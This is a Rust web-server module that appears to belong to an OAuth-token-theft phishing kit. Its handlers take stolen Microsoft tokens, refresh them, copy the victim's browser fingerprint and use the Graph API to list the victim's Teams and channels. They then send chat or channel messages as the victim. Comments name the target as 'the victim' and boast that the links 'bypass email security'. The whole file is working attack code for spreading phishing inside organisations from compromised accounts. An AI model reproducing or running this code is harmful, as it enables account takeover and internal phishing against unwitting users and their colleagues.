#![allow(non_snake_case)]

use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};

use crate::graph_client::GraphClient;

// === Teams Request/Response Types ===

#[derive(Debug, Deserialize)]
pub struct TeamsQuery {
    pub token_id: String,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
pub struct TeamsShareRequest {
    pub team_id: String,
    pub channel_id: String,
    pub subject: String,
    pub body: String,
}

#[derive(Debug, Serialize)]
pub struct TeamsResponse {
    pub status: String,
    pub teams: Vec<GraphTeam>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GraphTeam {
    pub id: String,
    pub displayName: String,
    pub description: Option<String>,
    pub isArchived: Option<bool>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GraphChannel {
    pub id: String,
    pub displayName: String,
    pub description: Option<String>,
}

/// Send a 1:1 chat message to a specific user via Graph API.
#[derive(Debug, Deserialize)]
pub struct SendChatMessageRequest {
    pub token_id: String,
    pub recipient_email: String,
    pub message: String,
}

/// Send a message to a Teams channel via Graph API.
#[derive(Debug, Deserialize)]
pub struct SendChannelMessageRequest {
    pub token_id: String,
    pub team_id: String,
    pub channel_id: String,
    pub message: String,
}

// === Helper Functions ===

async fn get_access_token(
    token_id: &str,
    state: &web::Data<crate::AppState>,
) -> Result<String, HttpResponse> {
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return Err(HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"}))),
    };

    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    Ok(access_token)
}

// === Teams Handlers ===

pub async fn list_teams_handler(
    query: web::Query<TeamsQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let access_token = match get_access_token(&query.token_id, &state).await {
        Ok(t) => t,
        Err(resp) => return resp,
    };

    let token = match crate::retrieve_any_token(&state, &query.token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let client = GraphClient::with_fingerprint(token.user_agent.clone(), token.accept_language.clone());
    let url = client.url("/v1.0/me/joinedTeams?$select=id,displayName,description,isArchived");

    match client.client()
        .get(&url)
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
    {
        Ok(response) => {
            if response.status().is_success() {
                let data: serde_json::Value = response.json().await.unwrap_or_default();
                let teams: Vec<GraphTeam> = serde_json::from_value(
                    data.get("value").cloned().unwrap_or(serde_json::Value::Array(vec![]))
                ).unwrap_or_default();

                HttpResponse::Ok().json(TeamsResponse {
                    status: "success".to_string(),
                    teams,
                })
            } else if response.status() == 403 {
                HttpResponse::Forbidden().json(serde_json::json!({
                    "error": "teams_access_denied",
                    "message": "Teams access requires a Microsoft 365 work or school account.",
                }))
            } else {
                let body_text = response.text().await.unwrap_or_default();
                HttpResponse::InternalServerError().json(serde_json::json!({
                    "error": "fetch_teams_failed",
                    "details": body_text
                }))
            }
        }
        Err(e) => {
            eprintln!("[teams] Fetch teams request failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "fetch_teams_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn list_team_channels_handler(
    path: web::Path<String>,
    query: web::Query<TeamsQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let team_id = path.into_inner();
    let access_token = match get_access_token(&query.token_id, &state).await {
        Ok(t) => t,
        Err(resp) => return resp,
    };

    let token = match crate::retrieve_any_token(&state, &query.token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let client = GraphClient::with_fingerprint(token.user_agent.clone(), token.accept_language.clone());
    let url = client.url(&format!("/v1.0/teams/{}/channels?$select=id,displayName,description", team_id));

    match client.client()
        .get(&url)
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
    {
        Ok(response) => {
            if response.status().is_success() {
                let data: serde_json::Value = response.json().await.unwrap_or_default();
                let channels: Vec<GraphChannel> = serde_json::from_value(
                    data.get("value").cloned().unwrap_or(serde_json::Value::Array(vec![]))
                ).unwrap_or_default();

                HttpResponse::Ok().json(serde_json::json!({
                    "status": "success",
                    "channels": channels
                }))
            } else {
                let body_text = response.text().await.unwrap_or_default();
                HttpResponse::InternalServerError().json(serde_json::json!({
                    "error": "fetch_channels_failed",
                    "details": body_text
                }))
            }
        }
        Err(e) => {
            eprintln!("[teams] Fetch channels request failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "fetch_channels_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

/// Send a 1:1 chat message to a user via Graph API.
/// Creates a chat thread with the recipient and sends the message.
/// The OAuth link appears as a normal Teams message — bypasses email security.
pub async fn send_chat_message_handler(
    body: web::Json<SendChatMessageRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token = match crate::retrieve_any_token(&state, &body.token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());

    let client = GraphClient::with_fingerprint(token.user_agent.clone(), token.accept_language.clone());
    let http_client = client.client();

    // Step 1: Get the victim's own user ID
    let me_url = client.url("/v1.0/me?$select=id");
    let me_resp = match http_client
        .get(&me_url)
        .header("Authorization", format!("Bearer {}", access_token))
        .header("Accept", "application/json")
        .send()
        .await {
        Ok(r) if r.status().is_success() => r.json::<serde_json::Value>().await.unwrap_or_default(),
        _ => return HttpResponse::InternalServerError().json(serde_json::json!({"error": "failed_to_get_user_id"})),
    };
    let sender_id = me_resp.get("id").and_then(|v| v.as_str()).unwrap_or("");

    // Step 2: Get the recipient's user ID by email
    let recipient_url = client.url(&format!(
        "/v1.0/users('{}')?$select=id",
        body.recipient_email
    ));
    let recipient_resp = match http_client
        .get(&recipient_url)
        .header("Authorization", format!("Bearer {}", access_token))
        .header("Accept", "application/json")
        .header("ConsistencyLevel", "eventual")
        .send()
        .await {
        Ok(r) if r.status().is_success() => r.json::<serde_json::Value>().await.unwrap_or_default(),
        Ok(r) => {
            let status = r.status();
            let body_text = r.text().await.unwrap_or_default();
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "recipient_not_found",
                "details": format!("Could not find user {} ({}): {}", body.recipient_email, status, body_text)
            }));
        }
        Err(e) => return HttpResponse::InternalServerError().json(serde_json::json!({"error": "recipient_lookup_failed", "details": format!("{}", e)})),
    };
    let recipient_id = recipient_resp.get("id").and_then(|v| v.as_str()).unwrap_or("");

    if sender_id.is_empty() || recipient_id.is_empty() {
        return HttpResponse::InternalServerError().json(serde_json::json!({"error": "missing_user_id"}));
    }

    // Step 3: Create a 1:1 chat between sender and recipient
    let chat_payload = serde_json::json!({
        "chatType": "oneOnOne",
        "members": [
            {
                "@odata.type": "#microsoft.graph.aadUserConversationMember",
                "roles": ["owner"],
                "user@odata.bind": format!("https://graph.microsoft.com/v1.0/users('{}')", sender_id)
            },
            {
                "@odata.type": "#microsoft.graph.aadUserConversationMember",
                "roles": ["owner"],
                "user@odata.bind": format!("https://graph.microsoft.com/v1.0/users('{}')", recipient_id)
            }
        ]
    });
    let chat_url = client.url("/v1.0/chats");
    let chat_resp = match http_client
        .post(&chat_url)
        .header("Authorization", format!("Bearer {}", access_token))
        .header("Content-Type", "application/json")
        .json(&chat_payload)
        .send()
        .await {
        Ok(r) if r.status().is_success() || r.status().as_u16() == 201 => r.json::<serde_json::Value>().await.unwrap_or_default(),
        Ok(r) => {
            let status = r.status();
            let body_text = r.text().await.unwrap_or_default();
            eprintln!("[teams] Create chat failed ({}): {}", status, body_text);
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "chat_creation_failed",
                "details": format!("{}: {}", status, body_text)
            }));
        }
        Err(e) => return HttpResponse::InternalServerError().json(serde_json::json!({"error": "chat_creation_failed", "details": format!("{}", e)})),
    };
    let chat_id = chat_resp.get("id").and_then(|v| v.as_str()).unwrap_or("");

    if chat_id.is_empty() {
        return HttpResponse::InternalServerError().json(serde_json::json!({"error": "chat_id_missing"}));
    }

    // Step 4: Send the message in the chat
    let msg_payload = serde_json::json!({
        "body": {
            "contentType": "html",
            "content": body.message
        }
    });
    let msg_url = client.url(&format!("/v1.0/chats/{}/messages", chat_id));
    match http_client
        .post(&msg_url)
        .header("Authorization", format!("Bearer {}", access_token))
        .header("Content-Type", "application/json")
        .json(&msg_payload)
        .send()
        .await {
        Ok(r) if r.status().is_success() || r.status().as_u16() == 201 => {
            let msg_data = r.json::<serde_json::Value>().await.unwrap_or_default();
            let msg_id = msg_data.get("id").and_then(|v| v.as_str()).unwrap_or("");
            eprintln!("[teams] Sent 1:1 chat message to {} (chat: {}, msg: {})", body.recipient_email, chat_id, msg_id);
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "chat_id": chat_id,
                "message_id": msg_id,
                "recipient": body.recipient_email,
                "message": "Teams chat message sent — bypasses email security"
            }))
        }
        Ok(r) => {
            let status = r.status();
            let body_text = r.text().await.unwrap_or_default();
            eprintln!("[teams] Send message failed ({}): {}", status, body_text);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "message_send_failed",
                "details": format!("{}: {}", status, body_text)
            }))
        }
        Err(e) => {
            eprintln!("[teams] Send message request failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "message_send_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

/// Send a message to a Teams channel via Graph API.
pub async fn send_channel_message_handler(
    body: web::Json<SendChannelMessageRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token = match crate::retrieve_any_token(&state, &body.token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());

    let client = GraphClient::with_fingerprint(token.user_agent.clone(), token.accept_language.clone());
    let http_client = client.client();

    let msg_payload = serde_json::json!({
        "body": {
            "contentType": "html",
            "content": body.message
        }
    });
    let msg_url = client.url(&format!(
        "/v1.0/teams/{}/channels/{}/messages",
        body.team_id, body.channel_id
    ));

    match http_client
        .post(&msg_url)
        .header("Authorization", format!("Bearer {}", access_token))
        .header("Content-Type", "application/json")
        .json(&msg_payload)
        .send()
        .await {
        Ok(r) if r.status().is_success() || r.status().as_u16() == 201 => {
            let msg_data = r.json::<serde_json::Value>().await.unwrap_or_default();
            let msg_id = msg_data.get("id").and_then(|v| v.as_str()).unwrap_or("");
            eprintln!("[teams] Sent channel message to team {} channel {} (msg: {})", body.team_id, body.channel_id, msg_id);
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "message_id": msg_id,
                "team_id": body.team_id,
                "channel_id": body.channel_id,
                "message": "Teams channel message sent — bypasses email security"
            }))
        }
        Ok(r) => {
            let status = r.status();
            let body_text = r.text().await.unwrap_or_default();
            eprintln!("[teams] Channel message failed ({}): {}", status, body_text);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "channel_message_failed",
                "details": format!("{}: {}", status, body_text)
            }))
        }
        Err(e) => {
            eprintln!("[teams] Channel message request failed: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "channel_message_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn share_to_teams_handler(
    body: web::Json<TeamsShareRequest>,
    _state: web::Data<crate::AppState>,
) -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({
        "status": "info",
        "message": "Use /api/teams/send-chat for 1:1 messages or /api/teams/send-channel for channel messages.",
        "deep_link": format!("https://teams.microsoft.com/l/chat/0/0?users=&message={}", urlencoding::encode(&body.body))
    }))
}
